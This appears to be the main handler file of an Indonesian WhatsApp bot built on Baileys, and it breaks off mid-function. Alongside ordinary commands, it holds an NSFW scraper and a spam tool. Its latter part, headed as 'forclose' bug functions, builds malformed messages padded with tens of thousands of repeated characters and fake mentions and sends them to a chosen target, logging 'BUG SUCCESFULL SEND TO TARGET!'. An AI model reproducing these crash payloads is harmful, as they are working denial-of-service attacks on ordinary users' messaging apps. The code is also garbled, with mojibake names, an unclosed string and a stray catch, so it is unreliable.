require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const path = require('path')
const cp = require('child_process');
const { promisify } = require('util');
const util = require("util");
const ms = require("parse-ms");
const sharp = require('sharp');
const JsConfuser = require('js-confuser');
const yts = require('yt-search')
const cheerio = require('cheerio');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
const { color } = require('./lib/color');

const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    downloadContentFromMessage,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

module.exports = justinn = async (justinn, m, chatUpdate, mek, store) => {
    try {
        if (global.db.data == null) await loadDatabase();
        require('./lib/database/schema')(m);

const chats = global.db.data.chats[m.chat];
const users = global.db.data.users[m.sender];
const settings = global.db.data.settings;
      
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? html.parse(m.msg.nativeFlowResponseMessage.paramshtml).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const budy = (typeof m.text === 'string' ? m.text : '');
        
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = html.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") justinn.ev.emit("message.delete", m.message.protocolMessage.key);
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

//=============== DATABASE ================//
const kontributor = html.parse(fs.readFileSync('./start/lib/database/owner.html'));
const _afk = html.parse(fs.readFileSync('./start/lib/database/afk.html'));
const pendaftar = html.parse(fs.readFileSync('./start/lib/database/pendaftar.html'));
const orang_spam = html.parse(fs.readFileSync('./start/lib/database/spaming.html'));
const user_ban = html.parse(fs.readFileSync('./start/lib/database/banned.html'))
const botNumber = await justinn.decodeJid(justinn.user.id);
const isUser = pendaftar.includes(m.sender)
const Access = [global.owner, ...kontributor, ...global.owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender) ? true : m.isChecking ? true :false
const uploadImage = require('./lib/uploadImage');
const To = ["https://files.catbox.moe/r14cz4.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)] 
const Kntl = ["https://files.catbox.moe/r14cz4.jpg"]
const C2 = Kntl[Math.floor(Math.random() * Kntl.length)]
const Tol = ["https://files.catbox.moe/5mhbx6.mp3"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const prefa = ["", "!", ".", ",", "ðŸ¤", "ðŸ—¿"]
const prefix = /^[Â°zZ#$@+,.?=''():âˆš%!Â¢Â£Â¥â‚¬Ï€Â¤Î Î¦&><â„¢Â©Â®Î”^]/.test(body) ? body.match(/^[Â°zZ#$@+,.?=''():âˆš%Â¢Â£Â¥â‚¬Ï€Â¤Î Î¦&><!â„¢Â©Â®Î”^]/gi) : ''
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const getQuoted = (m.quoted || m)
const quoted = getQuoted 
    ? (getQuoted.type === 'buttonsMessage' && Object.keys(getQuoted).length > 1) 
        ? getQuoted[Object.keys(getQuoted)[1]] 
        : (getQuoted.type === 'templateMessage' && getQuoted.hydratedTemplate && Object.keys(getQuoted.hydratedTemplate).length > 1) 
            ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] 
            : (getQuoted.type === 'product' && Object.keys(getQuoted).length > 0) 
                ? getQuoted[Object.keys(getQuoted)[0]] 
                : m.quoted 
                    ? m.quoted 
                    : m
    : m.quoted 
        ? m.quoted 
        : m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime);
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const groupMetadata = isGroup ? await justinn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
const isBan = user_ban.includes(m.sender)

//=============== TIME ================//
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "ðŸŒƒð’ðžð¥ðšð¦ðšð­ ðŒðšð¥ðšð¦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "ðŸŒ„ð’ðžð¥ðšð¦ðšð­ ð’ð¨ð«ðž"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "ðŸžï¸ð’ðžð¥ðšð¦ðšð­ ð’ð¢ðšð§ð "
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "ðŸ™ï¸ð’ðžð¥ðšð¦ðšð­ ððšð ð¢"
} else {
    ucapanWaktu = "ðŸŒ†ð’ðžð¥ðšð¦ðšð­ ð’ð®ð›ð®ð¡"
};

var crypto = require("crypto")
const peler = fs.readFileSync('./start/lib/media/ytjustin.jpg')
const loveu = fs.readFileSync('./start/lib/media/justinganteng.jpg')
const cina = ["https://files.catbox.moe/1no8wl.jpg"]
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": "Creator JustinAndiar"}}}
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `YT : JustinOfficial-ID`,jpegThumbnail: ""}}}
function capital(string) { 
return string.charAt(0).toUpperCase() + string.slice(1); 
}
const createSerial = (size) => { 
return crypto.randomBytes(size).toString('hex').slice(0, size) 
}

async function reply(teks) {
justinn.sendMsg(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], forwardedNewsletterMessageInfo: {newsletterName: "Information Script Justin", newsletterJid: "120363373003239606@newsletter"}, isForwarded: true, externalAdReply: {showAdAttribution: true, isForwarded: true, containsAutoReply: true, title: global.namabot, body: `WhatsApp Bot`, thumbnail: fs.readFileSync("./start/lib/media/justinoffc.jpg"), sourceUrl: `https://youtube.com/@justinofficial-id`
}
}
}, {quoted: catalems })
}
 
const catalems = {
        key: {
      remoteJid: '0@s.whatsapp.net',
      fromMe: false,
      id: '4B6CE60895B0D5C04D9FF7CB05566293',
      participant: '0@s.whatsapp.net'
    },
    message: {
      stickerPackMessage: {
        name: 'YT : JustinOfficial-ID',
        stickerPackId: '6793b295-854b-47d3-beea-932fcdb36cf4',
        stickerPackSize: 3,
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        trayIconFileName: '',
        thumbnail: loveu,
        contextInfo: {}
      }
    }
  };
        
function randomNumber() {
const digits = [];
while (digits.length < 6) {
const randomDigit = Math.floor(Math.random() * 10);
if (!digits.includes(randomDigit)) {
digits.push(randomDigit);
}
}
return digits.join("");
}
function getRandomImage() {
    const randomIndex = Math.floor(Math.random() * cina.length);
    return cina[randomIndex];
}
const cinahitam = getRandomImage()
async function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    tanggal,
    generateMessageTag, 
    getBuffer,
    getSizeMedia, 
    runtime, 
    fetchhtml, 
    sleep,
    getRandom
} = require('./lib/myfunction');
    
const { 
    imageToWebp, 
    videoToWebp,
    writeExifImg,
    writeExifVid,
    addExif
} = require('./lib/exif')

const {
  pinterest2,
  remini,
  mediafire,
  tiktokDl,
} = require("./lib/scraper")

const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./jadibot')


const { ytdl } = require('./lib/scrape/scrape-ytdl');   
const { spamngl } = require('./lib/scrape/scrape-ngl');
const { pindl } = require('./lib/scrape/scrape-pindl')
const { tiktok } = require('./lib/scrape/scrape-tiktok')
const { igdl } = require('./lib/scrape/scrape-igdl')
const { luminai } = require('./lib/scrape/scrape-luminai')
const { VocalRemover } = require('./lib/scrape/scrape-tovocal')
const { Telesticker } = require('./lib/scrape/scrape-telesticker')
const { pinterest } = require("./lib/scrape/scrape-pinterest");
const { scrapeSoundCloud } = require("./lib/scrape/scrape-soundcloud")
const msgFilter = require("./lib/antispam");
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);
let limitUser = isPremium ? 1500 : global.limitCount
        
const reaction = async (jidss, emoji) => {
    justinn.sendMsg(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };

const x = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://files.catbox.moe/1no8wl.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token:"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
       
 async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
async function resetLimit() {
  for (let i of users) {
      db.data.users[i].limit = limitUser;
  }
}

if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`ðŸ©¸YT : JustinOfficial-ID`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `  => Tanggal: ${new Date().toLocaleString()} \n` +
                    `  âŒ¬ DATE: ${new Date().toLocaleString()} \n` +
                    `  âŒ¬ MESSAGE: ${m.body || m.mtype} \n` +
                    `  âŒ¬ SENDERNAME: ${pushname} \n` +
                    `  âŒ¬ JIDS: ${m.sender}`
                )
            );


            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#ffffff").black(
                        `  âŒ¬ GRUP: ${groupName} \n` +
                        `  âŒ¬ GROUPJID: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
if (isCmd && !isUser) {
    pendaftar.push(m.sender)
    fs.writeFileSync('./start/lib/database/pendaftar.html', html.stringify(pendaftar, null, 2))
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
msgFilter.ResetSpam(orang_spam);
        const spampm = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give pause for a few seimads.");
        };
        const spamgr = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give 10 seconnds.");
    };
    if (isCmd && msgFilter.isFiltered(m.sender) && m.isGroup) return spampm();
    if (isCmd && msgFilter.isFiltered(m.sender) && !m.isGroup) return spamgr();

async function sendMusic(teks) {
    let img = { url : cinahitam, 
               type : "image/jpeg"
              }        
    let url = `www.tiktok.com/@justinandiar`    
    let contextInfo = {
        externalAdReply: {    
            showAdAttribution: true,    
            title: `Justin Official V20`,      
            body: `BÃ­t.ly/JustinOfficial`,     
            description: 'Creator Justin',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    justinn.sendMsg(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }
     
 if (!m.key.fromMe && global.autoread) {
     const readkey = {
         remoteJid: m.chat,
         id: m.key.id,
         participant: m.isGroup ? m.key.participant : undefined
     }
     await justinn.readMessages([readkey]);
 }
        justinn.sendPresenceUpdate('available', m.chat)
      
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

        
async function makeStickerFromUrl(imageUrl, justinn, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await justinn.sendMsg(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Justin Official V20`,
                    body: `Version Vip`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: cinahitam, 
                    sourceUrl: `https://youtube.com/@justinofficial-id`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}
      
 
  
 if (chats.antilink) {
     if (budy.includes('chat.whatsapp.com')) {
         if (isAdmins || Access) return;
         reply(`> LINK GRUP TERDETEKSI\n\nDilarang Mengirim Link Grup Didalam Sini!!`);
         if (!isBotAdmins) return reply(`bot bukan admin`);
         let gclink = `https://chat.whatsapp.com/${await justinn.groupInviteCode(m.chat)}`;
         if (budy.includes(gclink)) return;
         await justinn.sendMsg(m.chat, {
             delete: m.key
         });	
     }  
 }

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

justinn.autoshalat = justinn.autoshalat ? justinn.autoshalat : {};
        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? justinn.user.id : m.sender;
        let id = m.chat;
        if (id in justinn.autoshalat) {
            return false;
        }
        let jadwalSholat = {
            shubuh: "04:27",
            terbit: "05:52",
            dzuhur: "12:05",
            ashar: "15:32",
            magrib: "18:17",
            isya: "19:33",
        };

        const datek = new Date(
            new Date().toLocaleString("en-US", {
                timeZone: "Asia/Makassar",
            }),
        );
        const hours = datek.getHours();
        const minutes = datek.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                let caption = `${pushname}
Waktu *${sholat}* Telah Tiba, Ambilah Air Wudhu Dan Segeralah Shalat,

*${waktu}*
Untuk Wilayah Jawa Barat Dan Sekitarnya.`;
                justinn.autoshalat[id] = [
                    justinn.sendMsg(m.chat, { 
                        text: caption,
                        footer: "Developer JustinOfficial",
                        buttons: [
                            {
                                buttonId: ".baik", 
                                buttonText: { 
                                    displayText: 'Oke Siap' 
                                }, type: 1 }
                        ],
                        viewOnce: true,
                        headerType: 1
                    }, { quoted: m }),
                    setTimeout(async () => {
                        delete justinn.autoshalat[m.chat];
                    }, 57000),
                ];
            }
        }
//=============== NSFW ================//
  async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
//=============== PLUGINS ================//
const pluginsLoader = async (directory) => {
    let plugins = [];
    const folders = fs.readdirSync(directory);
    folders.forEach(file => {
        const filePath = path.join(directory, file);
        if (filePath.endsWith(".js")) {
            try {
                const resolvedPath = require.resolve(filePath);
                if (require.cache[resolvedPath]) {
                    delete require.cache[resolvedPath];
                }
                const plugin = require(filePath);
                plugins.push(plugin);
            } catch (error) {
                console.log(`${filePath}:`, error);
            }
        }
    });
    return plugins;
};

const pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "../plugins"));
const plug = { 
    justinn,
    Access,
    command,
    isCmd,
    reply,
    text,
    chats,
    users,
    args,
    botNumber,
    reaction,
    makeStickerFromUrl,
    pushname,
    isBan,
    isPremium,
    isGroup: m.isGroup,
    isPrivate: !m.isGroup
};

for (let plugin of plugins) {
    if (plugin.command.find(e => e == command.toLowerCase())) {
        if (plugin.owner && !Access) {
            return reply(mess.owner);
        }
        if (plugin.premium && !isPremium) {
            return reply(ness.premium);
        }
        if (plugin.group && !plug.isGroup) {
            return reply(mess.group);
        }
        if (plugin.private && !plug.isPrivate) {
            return reply(mess.private);
        }
        if (typeof plugin !== "function") return;
        await plugin(m, plug);
    }
}

if (!pluginsDisable) return;


//FUNCTION FORCLOSE
async function infinityThan(justinn, objective) {
   let videoServer = await prepareWAMessageMedia({
         video: {
            url: "https://files.catbox.moe/h3hf0r.mp4"
         }
      }, {
         upload: justinn.waUploadToServer
      })
   let msg = await generateWAMessageFromContent(objective, proto.Message.fromObject({
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "ðŸ©¸JustinXThan" 
                    },
                    carouselMessage: {
                        cards: [{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        }]
                    },
                    contextInfo: {
                        mentionedJid: [objective]
                    }
                }
            }
        }
    }), {
      userJid: objective,
      quoted: null
   });
   await justinn.relayMsg(objective, msg.message, {
      participant: {
         jid: objective
      }
   });
};

async function Caraousel(justinn, isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'CardsCarousel',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Caraousel"
                },
                footer: {
                  text: "sex.html"
                },
                nativeFlowMessage: {
                  messageParamshtml: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramshtml: "{ sex.file.html }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await justinn.relayMsg(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

async function âŒ¬ Izalcs(sock, target) {
  const cards = [];

  for (let i = 0; i < 100; i++) { // GANTI JADI KALO EROR
    cards.push({
      header: {
        videoMessage: {
          mimetype: "video/mp4",
          caption: "âŒ¬ Izalcs",
          url: "https://files.catbox.moe/wvnrqw.mp4",
          fileLength: "999999999999",
          seconds: 10000
        }
      },
      nativeFlowMessage: {
        messageParamshtml: "{".repeat(10000),
        buttons: [
          {
            name: "âŒ¬ IzalcsðŸ’‹ðŸ¥¶",
            buttonParamshtml: `{"âŒ¬ Izalcs ðŸ’‹ðŸ¥¶":"${"á¬´".repeat(60000)}","sections":[{"âŒ¬ Izalcs ðŸ’‹ðŸ¥¶":" âŒ¬ Izalcs ðŸ’‹ðŸ¥¶? ","rows":[]}]}`
          },
          {
            name: "âŒ¬ IzalcsðŸ’‹ðŸ¥¶",
            buttonParamshtml: "âŒ¬ Izalcs ðŸ’‹ðŸ¥¶".repeat(10000)
          }
        ]
      }
    });
  }

  const contextInfo = {
    forwardingScore: 999,
    isForwarded: true,
    stanzaId: "FnX-" + Date.now(),
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    mentionedJid: [
      target,
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ],
    quotedMessage: {
      extendedTextMessage: {
        text: "\u0000".repeat(60000),
        contextInfo: {
          mentionedJid: ["13135550001@s.whatsapp.net"],
          externalAdReply: {
            title: "âŒ¬ Izalcs ðŸ’‹ðŸ¥¶",
            body: "Trusted System",
            thumbnailUrl: "https://files.catbox.moe/wvnrqw.mp4",
            mediaType: 1,
            sourceUrl: "https://files.catbox.moe/wvnrqw.mp4",
            showAdAttribution: false
          }
        }
      }
    },
    externalAdReply: {
      title: "[ ! ] âŒ¬ Izalcs",
      body: "AI Broadcast",
      thumbnailUrl: "https://files.catbox.moe/wvnrqw.mp4https://files.catbox.moe/wvnrqw.mp4",
      mediaType: 1,
      sourceUrl: "https://github.com/izalxys,
      showAdAttribution: false
    },
    businessMessageForwardInfo: {
      businessOwnerJid: "13135550002@s.whatsapp.net"
    }
  };

  const IzalcsMessage = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "âŒ¬ Izalcs".repeat(30000)
          },
          carouselMessage: {
            cards,
            messageVersion: 1
          },
          nativeFlowMessage: {
            messageParamshtml: "{".repeat(50000)
          },
          contextInfo
        }
      }
    }
  };

  await sock.sendMessage(target, IzalcsMessage);

  await sock.relayMessage(target, IzalcsMessage, {
    messageId: "FnX-" + Date.now()
  });
  console.log("[ ! ] BUG SUCCESFULL SEND TO TARGET!");
  } catch (err) {
    console.error("[âŒ] Gagal kirim bug:", err);
  }
}

async function âŒ¬ Izalfcbos(sock, jid) {
  const mentionedJidList = [
    jid,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`)
  ];

  try {
  const payload = {
    key: {
      remoteJid: jid,
      fromMe: false,
      id: " KILLER-UI" + Date.now()
    },
    message: {
      interactiveMessage: {
        header: {
          title: " </> Zal Not Dev\n\n" + "IzalmodzðŸ©¸".repeat(5000),
          hasMediaAttachment: false
        },
        body: {
          text: "IzalmodzðŸ©¸".repeat(5000) + "IzalmodzðŸ©¸".repeat(5000),
        },
        nativeFlowMessage: {
          messageParamshtml: "{[(".repeat(15000),
          buttons: [
            {
              name: "single_select",
              buttonParamshtml: html.stringify({ status: true })
            },
            {
              name: "send_location",
              buttonParamshtml: "{}"
            },
            {
              name: "call_permission_request",
              buttonParamshtml: html.stringify({ status: true })
            },
            {
              name: "payment_method",
              buttonParamshtml: ""
            },
            {
              name: "form_message",
              buttonParamshtml: ""
            },
            {
              name: "catalog_message",
              buttonParamshtml: ""
            },
            {
              name: "review_and_pay",
              buttonParamshtml: ""
            }
          ]
        }
      }
    },
    messageContextInfo: {
      mentionedJid: mentionedJidList,
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: 1,
          expiryTimestamp: null
        }
      },
      externalAdReply: {
        title: "",
        body: "@Izalmodz",
        thumbnailUrl: null,
        sourceUrl: "https://t.me/Izalmodz"
      }
    }
  };

    await sock.relayMessage(jid, payload.message, { messageId: payload.key.id });

    await sock.sendMessage(jid, payload.message, {
      quoted: {
        key: payload.key,
        message: payload.message
      }
    });

    console.log("[ ! ] BUG SUCCESFULL SEND TO TARGET!");
  } catch (err) {
    console.error("[âŒ] Gagal kirim bug:", err);
  }
}

//BUG FC INVIS
async function invisCrL(isTarget, rep, mention) {
  const space = "\n".repeat(rep)
  const PrM = await prepareWAMessageMedia(
    { image: peler },
    { upload: justinn.waUploadToServer }
  );

  const cardsCrL = Array.from({ length: 10 }, () => ({
    header: {
      imageMessage: PrM.imageMessage,
      hasMediaAttachment: true
    },
    nativeFlowMessage: {
      messageParamshtml: space
    }
  }));

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "ðŸ©¸ YT JustinOfficial-ID " },
          carouselMessage: {
            cards: cardsCrL,
            messageVersion: 1
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messagePayload, {});

